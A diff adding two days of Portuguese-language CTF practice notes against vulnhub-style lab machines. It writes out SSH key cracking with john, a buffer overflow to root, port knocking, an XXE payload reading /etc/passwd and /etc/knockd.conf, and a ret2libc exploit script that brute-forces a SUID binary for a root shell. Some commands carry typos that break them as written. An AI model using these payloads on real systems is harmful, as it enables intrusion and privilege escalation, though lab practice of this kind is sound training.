@@ -1331,3 +1331,162 @@ Desafio 29 - - https://www.vulnhub.com/entry/pegasus-1,109/ </br>
 									
 									sudo cpulimit -l 100 -f /bin/sh
 									root
+
+
+
+
+<h3>Dia 27 			3/10/2020</h3>
+
+	*scan defaul
+		#31337 werkzeug
+		#dirb ip_vm
+			ip:31337/.ssh/id_rsa
+			ip:31337/.ssh/id_rsa.pub
+			
+		*ssh
+			locate ssh2john
+				python ssh2john.py id_rsa > passSSH
+				john passSSH
+				
+				*ssh simon@ip_vm
+				starwars
+			
+			#cat /root/read_message.c
+
+				/home/simon/read_message
+					name: Simon
+					
+					*BufferOverflaw
+					#python3 -c "print('Simon','\x00'*45)" | read_message
+
+					read_message
+					SimonAAAAAAAAAAAAAAA/bin/sh
+					
+					root
+
+
+
+
+<h3>Dia 28 			4/10/2020</h3>
+
+
+apt intall gdb
+
+	*tcpdump -A -n host ip_vm and not arp -i eth2 -vv
+		#j19s4w	
+	
+		*nc -u ip_vm 666
+		
+			root@kali:/home/kali/Desktop# nc -u 192.168.100.35 666
+			j19s4w
+				ZmxhZzF7MzAzNGNjMjkyN2I1OWUwYjIwNjk2MjQxZjE0ZDU3M2V9CllvdSBjb21wbGV0ZWQgeW91ciBmaXJzdCB0ZXN0LiBOb3cga25vY2sgdGhlc2UgbnVtYmVycyB0byBmaW5kIHdoYXQgeW91IHNlZWsuIDU1MDAgNjYwMCA3NzAw
+				echo 'string_cima' | base64 -d
+					flag1{3034cc2927b59e0b20696241f14d573e}
+
+
+				python -c 'print "j19s4w" ' | nc -u 192.168.100.35 666 | base64 -d
+					#knock 192.168.100.35 5500 6600 7700
+						##apt install knockd
+					
+					
+			#browser ip_vm
+			wget http://ip_vm/jigsaw.gif
+			
+			*strings jigsaw.gif
+				#/w4n770p14y494m3
+				
+				#browser
+					ip_vm/w4n770p14y494m3
+					
+		
+		*burp
+			http://192.168.100.35/w4n770p14y494m3/		
+				view-page source
+					function XLMFunction
+					##falha XXE
+					*burp
+						email:xx
+						senha:xx
+						
+						<!DOCTYPE beco28 [<!ELEMENT batata ANY> <!ENTITY lapada SYSTEM "file:///etc/passwd">]>
+						email: &lapada;
+						password: nulo-vazio
+						
+						<!DOCTYPE beco28 [<!ELEMENT batata ANY> <!ENTITY lapada SYSTEM "file:///etc/knockd.conf">]>
+							#[openSSH] sequence    = 7011,8011,9011
+							
+							*knock -v ip_vm 7011 8011 9011
+						
+		*ssh jigsaw@192.168.100.35
+			pass: j19s4w
+			
+			find / -perm -u=s 2>&-
+				/bin/game3
+				file /bin/game3
+					/bin/game3 xxxxxx.........
+						segmentation fault			
+				
+		kali: scp jigsaw@192.168.100.35:/bin/game3 .
+			pass: j19s4w
+		
+							
+			gdb game3
+				run
+				pattern_create 100
+					[string]
+				run [string]		
+				
+				pattern_offset [EIP]
+				#76
+				
+			*ssh_vm:			OBS:"os valores podem variar!	/ acrescente o 0x" 
+				ldd /bin/game3
+					libc -> 0xb755b000 
+						 minha_vm -> 0xb7522000
+				
+				readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system			
+					system@@ -> 0x00040310
+						 minha_vm -> 0x00040310
+		
+				readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit
+					exit@@ -> 0x00033260
+						 minha_vm -> 0x00033260
+					
+					strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep bin/sh
+					 shell -> 0x00162d4c
+						 minha_vm -> 162d4c -> 0x00162d4c
+					
+				kali:
+					nano beco28.py
+					import struct
+					buf = "A" * 76
+					buf += struct.pack("<1", 0x12345678)
+					print buf
+					
+					
+				*gbd -> apt intall gdb
+					run `python beco28.py
+						EIP -> 0x12345678
+						
+				*vim xpl28.py
+					from subprocess import call
+					import struct
+					
+					libc = 0xb7522000
+					system_ = struct.pack("<I",libc + 0x00040310)
+					exit_ = struct.pack("<I", libc + 0x00033260)
+					shell = struct.pack("<I", libc + 0x00162d4c )
+					
+					buf = "A"*76
+					buf +=  system_
+					buf += exit_
+					buf += shell
+					
+					for i in range(0,512):
+						print('testando'+ str(buf))
+						a =call(["/bin/game3", buf])
+						
+					copiar, colar e executar na vm_alvo
+					
+					vm_alvo: python beco28.py
+						root
